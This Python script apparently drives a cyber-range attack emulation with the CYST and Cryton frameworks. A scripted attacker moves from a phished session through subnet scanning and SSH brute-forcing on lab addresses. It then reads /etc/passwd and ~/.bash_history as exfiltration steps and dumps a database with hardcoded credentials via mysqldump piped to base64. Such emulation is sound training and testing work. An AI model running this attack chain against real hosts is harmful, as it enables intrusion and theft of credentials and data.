from copy import deepcopy
from importlib_metadata import entry_points
from typing import Optional, Union, Any

from cyst.api.logic.action import ExecutionEnvironment, ExecutionEnvironmentType, Action
from cyst.api.host.service import ActiveService
from cyst.api.environment.environment import Environment
from cyst.api.environment.message import Status, StatusOrigin, StatusValue, Response
from cyst.api.logic.access import Authorization, AuthenticationToken
from cyst.api.network.session import Session
from cyst.core.environment.proxy import EnvironmentProxy
from cyst_services.scripted_actor.main import ScriptedActorControl

from cyst_models.cryton.environment import EnvironmentCryton


class Scenario:
    def __init__(self):
        self.environment = Environment.create()
        self.environment.control.init()
        self.environment.control.run()
        self.cryton_env = EnvironmentCryton(self.environment, "localhost", 8001)
        self.environment_proxy = EnvironmentProxy(self.cryton_env, 'attacker_node', 'scripted_actor')
        self.attacker = self.create_attacker()
        self.actions = self.get_actions()

    def create_attacker(self) -> ScriptedActorControl:
        attacker_service: Optional[ActiveService] = None

        for plugin in entry_points(group="cyst.services"):
            service_description = plugin.load()
            if service_description.name == "scripted_actor":
                attacker_service = service_description.creation_fn(self.environment_proxy, self.cryton_env, None)
                break

        if not attacker_service:
            exit(1)

        self.cryton_env.register_service("attacker_node", "scripted_actor", attacker_service)

        return self.environment.configuration.service.get_service_interface(attacker_service, ScriptedActorControl)

    def get_actions(self) -> dict[str, Action]:
        cryton_actions = self.environment.resources.action_store.get_prefixed(
            "dojo", ExecutionEnvironment(ExecutionEnvironmentType.EMULATION, "CRYTON")
        )

        return {action.id: action for action in cryton_actions}

    def display_actions(self) -> None:
        action_name_len = max([len(action.id) for action in self.actions.values()])
        action_description_len = max([len(action.description) for action in self.actions.values()])

        print(f"\n{'-'*50}\nAvailable actions:")
        for action in self.actions.values():
            print(f"{' '*(action_name_len-len(action.id))}{action.id}: "
                  f"{action.description}{' '*(action_description_len-len(action.description))} "
                  f"{list(action.parameters.keys())}")

    def finish(self):
        self.environment.control.commit()

        stats = self.environment.resources.statistics
        print(
            f"Run id: {stats.run_id}\nStart time real: {stats.start_time_real}\n"
            f"End time real: {stats.end_time_real}\nDuration virtual: {stats.end_time_virtual}"
        )

    def build_action(self, action_id: str, action_parameters: Optional[dict[str, Any]]) -> Action:
        action = deepcopy(self.actions[action_id])
        if action_parameters:
            for k, v in action_parameters.items():
                action.parameters[k].value = v

        return action

    def execute_action(
            self,
            action_id: str,
            ok_statuses: list[Status],
            action_parameters: dict[str, Any] = None,
            target: str = "192.168.1.100",
            service: str = "",
            session: Session = None,
            auth: Union[Authorization, AuthenticationToken] = None
    ) -> Response:
        action = self.build_action(action_id, action_parameters)
        self.attacker.execute_action(target, service, action, session, auth)
        response = self.attacker.get_last_response()
        print(response)

        if response.status not in ok_statuses:
            raise RuntimeError("Failed to open the session")

        return response


# TODO: add defaults to action's parameters
if __name__ == '__main__':
    scenario = Scenario()
    scenario.display_actions()
    scenario.cryton_env.proxy.check_connection()

    # ------------------------------------
    # Phishing
    # ------------------------------------

    # Get the initial session from phishing
    action_response = scenario.execute_action(
        "dojo:wait_for_session",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)]
    )

    # Update MSF's routing table
    action_response = scenario.execute_action(
        "dojo:update_routing",
        [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS), Status(StatusOrigin.NETWORK, StatusValue.FAILURE)],
        session=action_response.session
    )

    # ------------------------------------
    # Information gathering
    # ------------------------------------

    # Scan new network
    action_response = scenario.execute_action(
        "dojo:scan_network",
        [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
        {"to_network": "192.168.2.10"},  # 192.168.2.10/24 scans the whole subnet
        session=action_response.session,
    )

    # ------------------------------------
    # Access the dev account
    # ------------------------------------

    # Scan the hosts for ssh service
    action_response = scenario.execute_action(
        "dojo:find_services",
        [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
        {"to_network": "192.168.2.10", "services": "22"},  # 192.168.2.10/24 scans the whole subnet
        session=action_response.session,
    )

    # Bruteforce the ssh service
    action_response = scenario.execute_action(
        "dojo:exploit_server",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {"to_host": "192.168.2.10", "service": "ssh"},
        session=action_response.session,
    )

    # ------------------------------------
    # Gather information from the dev account
    # ------------------------------------

    # Home directory listing
    action_response = scenario.execute_action(
        "dojo:find_data",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {"to_host": "192.168.2.10", "directory": "~/"},
        session=action_response.session,
    )

    # Check for users
    action_response = scenario.execute_action(
        "dojo:exfiltrate_data",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {"to_host": "192.168.2.10", "data": "/etc/passwd"},
        session=action_response.session,
    )

    # Check for mysqldump
    action_response = scenario.execute_action(
        "dojo:execute_command",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {"to_host": "192.168.2.10", "command": "which mysqldump"},
        session=action_response.session,
    )

    # Check bash history
    action_response = scenario.execute_action(
        "dojo:exfiltrate_data",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {"to_host": "192.168.2.10", "data": "~/.bash_history"},
        session=action_response.session,
    )

    # ------------------------------------
    # Get data from DB
    # ------------------------------------

    # Get data from DB
    # TODO: since the db is in a different network, dns isn't working? wordpress_db_node is not recognised
    action_response = scenario.execute_action(
        "dojo:execute_command",
        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
        {
            "to_host": "192.168.2.10",
            "command": "mysqldump -u cdri -h 192.168.3.10 --password=cdri --no-tablespaces cdri | base64"
        },
        session=action_response.session,
    )

    scenario.finish()
